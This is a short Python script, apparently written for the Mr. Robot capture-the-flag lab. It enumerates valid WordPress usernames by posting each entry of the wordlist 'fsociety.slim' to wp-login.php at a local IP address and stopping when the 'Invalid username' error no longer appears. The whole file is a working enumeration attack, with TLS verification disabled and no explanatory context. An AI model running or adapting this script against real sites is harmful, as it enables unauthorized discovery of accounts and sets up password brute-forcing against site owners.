#!/usr/bin/python3
import requests
import pdb

with open ("fsociety.slim", "r") as f:
	usrdict = f.read()
usrdict = usrdict.split("\n")
for usr in usrdict:
	params= ("log{}&pwd=test&wp-submit=Log+In&testcookie=1".format(usr))
	payload = {'log':usr,'pwd':'123456'}
	headers = {'Content-Type' : 'application/x-www-form-urlencoded'}
	page = 'https://10.0.2.7/wp-login.php'
	cookies = dict(wordpress_test_cookie='WP+Cookie+check')
	r = requests.post(page, verify=False, data=payload, headers=headers, cookies=cookies)
	if "Invalid username" not in r.text:
		print (r.text)
		print(usr)
		break
